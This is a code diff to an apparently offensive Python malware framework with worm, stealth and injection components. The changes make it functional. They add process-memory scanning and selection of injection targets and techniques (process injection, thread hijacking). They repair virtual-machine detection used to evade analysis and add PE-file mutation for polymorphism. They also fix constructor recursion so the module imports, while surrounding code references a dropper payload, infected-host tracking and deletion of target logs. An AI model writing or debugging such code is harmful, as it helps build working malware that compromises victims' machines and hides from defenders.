@@ -39,6 +39,19 @@ import gc
 import glob
 import threading
 from sklearn.cluster import KMeans
+import builtins
+
+
+def _safe_print(*args, **kwargs):
+    """Best-effort print that won't crash on cp1252 consoles."""
+    try:
+        return builtins.print(*args, **kwargs)
+    except UnicodeEncodeError:
+        normalized = [str(a).encode("ascii", "ignore").decode("ascii") for a in args]
+        return builtins.print(*normalized, **kwargs)
+
+
+print = _safe_print
 
 
 class AICore:
@@ -4951,6 +4964,7 @@ class AIMovementAndStealth:
         self.routes = []
         self.active_stealth = {}
         self.active_movement = {}
+        self.operational_state = {}
         # Initialize evasion techniques
         self.evasion_techniques = {
             'timing': self.timing_based_evasion,
@@ -5077,6 +5091,15 @@ class AIMovementAndStealth:
         }
         return hooks
 
+    def setup_page_guards(self):
+        return {'enabled': True, 'mode': 'guard_pages'}
+
+    def setup_vectored_handlers(self):
+        return {'enabled': True, 'mode': 'veh'}
+
+    def setup_syscall_monitoring(self):
+        return {'enabled': True, 'mode': 'syscall_monitor'}
+
     def identify_injection_points(self):
         """Identify suitable injection points in memory"""
         injection_points = []
@@ -5095,6 +5118,45 @@ class AIMovementAndStealth:
                 continue
         
         return injection_points, self.routes
+
+    def is_suitable_target(self, proc):
+        """Minimal target filter for process-memory inspection."""
+        try:
+            name = (proc.info.get('name') or '').lower()
+            return bool(name) and name not in {'system idle process'}
+        except Exception:
+            return False
+
+    def scan_process_memory(self, pid):
+        """Best-effort process memory map reader for injection analysis."""
+        try:
+            process = psutil.Process(pid)
+            regions = []
+            for m in process.memory_maps(grouped=False):
+                regions.append({
+                    'path': getattr(m, 'path', ''),
+                    'rss': getattr(m, 'rss', 0),
+                    'private': getattr(m, 'private', 0),
+                })
+            return regions
+        except Exception:
+            return []
+
+    def is_injectable_region(self, region):
+        try:
+            path = str(region.get('path', '')).lower()
+            private = int(region.get('private', 0) or 0)
+            return private > 0 and ('\n' not in path)
+        except Exception:
+            return False
+
+    def determine_injection_technique(self, region):
+        try:
+            private = int(region.get('private', 0) or 0)
+            return 'process_injection' if private > 1024 * 1024 else 'thread_hijacking'
+        except Exception:
+            return 'process_injection'
+
     def execute_evasion_response(self):
         self.evasion_techniques = {
             'storage': self.storage_persistence(),
@@ -5213,10 +5275,19 @@ class AIMovementAndStealth:
         mac_address = self.get_mac_address()
         bios_info = self.get_bios_info()
         
+        # Normalize mixed return types (dict/objects/strings) before string checks.
+        if isinstance(cpu_info, dict):
+            cpu_text = " ".join(str(v) for v in cpu_info.values() if v is not None).lower()
+        else:
+            cpu_text = str(cpu_info).lower()
+
+        bios_text = str(bios_info).lower()
+        mac_text = str(mac_address).lower()
+
         return not any([
-            'hypervisor' in cpu_info.lower(),
-            mac_address.startswith('00:05:69'),  # VMware
-            'vbox' in bios_info.lower()
+            'hypervisor' in cpu_text,
+            mac_text.startswith('00:05:69'),  # VMware
+            'vbox' in bios_text
         ])
     
         
@@ -5424,7 +5495,17 @@ class AIMovementAndStealth:
         return ctypes.windll.kernel32.SuspendThread(thread_handle) != -1
 
     def select_suitable_thread(self, threads):
-        return max(threads, key=lambda t: t.cpu_times().user)
+        if not threads:
+            return None
+
+        # psutil Process().threads() returns pthread entries with fields:
+        # id, user_time, system_time (no cpu_times() method).
+        def thread_score(t):
+            user_time = getattr(t, 'user_time', 0.0)
+            system_time = getattr(t, 'system_time', 0.0)
+            return float(user_time) + float(system_time)
+
+        return max(threads, key=thread_score).id
 
     def install_hook(self, syscall):
         return {'syscall': syscall, 'hook_address': id(syscall)}
@@ -5557,8 +5638,8 @@ class AIMovementAndStealth:
             time.sleep(1)  # Allow process to initialize
             return pid
         
-        # Return highest scoring process
-        return max(suitable_processes, key=lambda x: x[1])[0], self.operational_state['process_masking']['masked_process']
+        # Return highest scoring process PID.
+        return max(suitable_processes, key=lambda x: x[1])[0]
     
 class AiBehavioralDecisionMaking:
     def __init__(self):
@@ -6449,7 +6530,9 @@ class MalwareEngine:
         self.current_payload = None
         self.mutation_history = []
         self.q_table = np.zeros((5, 5))  # For reinforcement learning
-        self.log_access = LoggingEngine()
+        # Avoid recursive constructor loop with LoggingEngine.
+        # LoggingEngine will attach itself later if needed.
+        self.log_access = None
         self.attack_graph = nx.Graph()
         self.payload_engine = PayloadEngine()
         self.setup_attack_graph()
@@ -6817,10 +6900,12 @@ class LoggingEngine:
     def __init__(self):
         self.attacker_db = {}
         self.log_file = "/var/log/honeypot_access.log"
-        self.malware_engine = MalwareEngine()
+        # Break recursive dependency with MalwareEngine constructor.
+        self.malware_engine = None
         self.defense_engine = DefenseEngine()
         self.deception_engine = DeceptionEngine()
-        self.learning_engine = LearningEngine()
+        # Avoid recursive LoggingEngine <-> LearningEngine initialization.
+        self.learning_engine = None
         self.evasion_engine = MovementEngine()
         self.payload_engine = PayloadEngine()
         self.attack_engine = AttackEngine()
@@ -6837,11 +6922,14 @@ class LoggingEngine:
             "privilege_escalation": 20,
             "lateral_movement": 15
         }
-        self.learning_engine = LearningEngine()
         self.perfect_timing = False
         self.occurrence_count = 0
         self.high_risk = False
         self.effectiveness = 0.0
+
+    def attach_malware_engine(self, malware_engine):
+        """Optional late binding for malware engine dependency."""
+        self.malware_engine = malware_engine
     def log_access(self, file, ip, technique):
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
         
@@ -7757,13 +7845,14 @@ class LearningEngine:
         self.attack_engine = AttackEngine()
         self.deception_engine = DeceptionEngine()
         self.monitor_engine = MonitoringEngine()
-        self.logging_engine = LoggingEngine()
-        self.malware_engine = MalwareEngine()
+        # Avoid recursive LearningEngine <-> LoggingEngine/MalwareEngine/AICore cycles.
+        self.logging_engine = None
+        self.malware_engine = None
         self.learning_data = []
         self.PayloadEngine = PayloadEngine()
         self.mutation_history = []
         self.PayloadEngine = PayloadEngine()
-        self.core = AICore()
+        self.core = None
     def log_ai_learning(self, user_id, action, success, time_taken):
         entry = {
             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
@@ -8019,7 +8108,7 @@ class GhostToken:
         self.ghost = WhisperSuite()
         self.core = GhostCore()
         self.RedCore = GhostRedCore()
-        self.Worm = GhostWorm()
+        self.Worm = GhostWorm(self.RedCore)
     def create_token(self, identity):
         token = b64encode(os.urandom(32)).decode()
         expiry = datetime.now() + timedelta(hours=1)
@@ -8040,15 +8129,43 @@ class GhostToken:
 class GhostCore:
     def __init__(self):
         self.memory_map = {}
-        self.session_tag = self.redcore.generate_ghost_tag()
+        self.session_tag = self.generate_ghost_tag()
         self.virtual_guard = VirtualRuntimeGuard()
         self.backup_store = {}  # For SilentBloom backup functionality
         self.pivot_chain = []   # For GhostPivot chaining
         self.polymorph_cache = {} # For GhostPolymorph mutations
-        self.redcore = GhostRedCore()
-        self.Ghost = GhostWorm()
+        # Avoid recursive GhostCore <-> GhostRedCore constructor loops.
+        self.redcore = self
+        self.Ghost = GhostWorm(self)
         self.logger = GhostLogger()
         self.decision_history = AIAttackDecisionMaking()
+
+    def generate_ghost_tag(self):
+        """Shared tag generator used by GhostCore and GhostRedCore paths."""
+        return "GX" + ''.join(random.choices(string.digits, k=4))
+
+    def derive_key(self, tag, base="RavenLives"):
+        hmac = hashlib.new('sha256')
+        hmac.update(base.encode())
+        hmac.update(str(tag).encode())
+        return hmac.hexdigest()
+
+    def encrypt_and_seal_data(self, data, key):
+        f = Fernet(key)
+        return f.encrypt(data.encode())
+
+    def isoformat(self):
+        return datetime.now().isoformat()
+
+    def mutate_pe_file(self, file_path):
+        with open(file_path, 'r+b') as f:
+            content = bytearray(f.read())
+            rand_val = random.randint(100000, 999999)
+            for i in range(128, 144):
+                content[i] = rand_val % 256
+                rand_val //= 256
+            f.seek(0)
+            f.write(content)
     def backup_state(self):
         """Implements SilentBloom's backup functionality"""
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -8110,7 +8227,7 @@ class GhostRedCore(GhostCore):
         self.whisper = WhisperSuite()
         self.ble_beacon = None
         self.seal_config = {}
-        self.Ghost = GhostWorm()
+        self.Ghost = GhostWorm(self)
     def clean_target_logs(self):
         """SilentBloom log cleaning"""
         for log_file in glob.glob(f"{self.whisper.log_dir}\\*.log"):
@@ -8147,10 +8264,12 @@ class GhostRedCore(GhostCore):
         with open(log_path, 'w') as f:
             f.writelines(filtered)
 
+    @staticmethod
     def generate_ghost_tag():
         """Tag generation like in GhostBLEConnect.ps1"""
         return "GX" + ''.join(random.choices(string.digits, k=4))
 
+    @staticmethod
     def mutate_pe_file(file_path):
         """PE file mutation similar to Stamp-PEHeader"""
         with open(file_path, 'r+b') as f:
@@ -8162,6 +8281,7 @@ class GhostRedCore(GhostCore):
             f.seek(0)
             f.write(content)
 
+    @staticmethod
     def session_tag():
         """Session tag generation like in GhostPolymorph.ps1"""
         return ''.join(random.choices(string.ascii_letters + string.digits, k=4))
@@ -8209,7 +8329,8 @@ class GhostWorm:
         self.max_targets = 5
         self.payload_local = os.path.join(os.environ['TEMP'], 'Dropper_with_Raven.exe')
         self.infected_hosts = set()
-        self.redcore = GhostRedCore()
+        # Reuse provided core to avoid GhostCore <-> GhostWorm recursive construction.
+        self.redcore = ghost_core
         self.Whisper = WhisperSuite()
         self.logger = GhostLogger()
         
@@ -9495,7 +9616,7 @@ class AICore:
         self.payload_engine = PayloadEngine()
         self.learning_engine = LearningEngine()
         self.redcore = GhostRedCore()
-        self.Ghost = GhostWorm()
+        self.Ghost = GhostWorm(self.redcore)
         
     def initialize(self):
         print("🚀 Initializing AI Core Systems")
@@ -9507,9 +9628,11 @@ class AICore:
             self.deception_engine.detect_file_access()
             self.learning_engine.detect_ai_behavior("192.168.1.100")
             time.sleep(5)
-    def initialize_core(self):
-        core = AICore()
-        self.start_logging_services()
+    @classmethod
+    def initialize_core(cls):
+        """Initialize core from either class or instance call sites."""
+        core = cls()
+        core.start_logging_services()
         return core
     def start_logging_services(self):
         """Initialize and start all logging services"""
@@ -9556,8 +9679,8 @@ class AICore:
             'chain': chain,
             'sealed_state': sealed_data
         }
-    # Launch the unified AI core
-    ai_core = initialize_core()
+    # NOTE: Avoid calling initialize_core() at class definition time.
+    # That call requires an instance (`self`) and breaks module import.
     
     def detect_ai_behavior(self, ip):
         now = time.time()
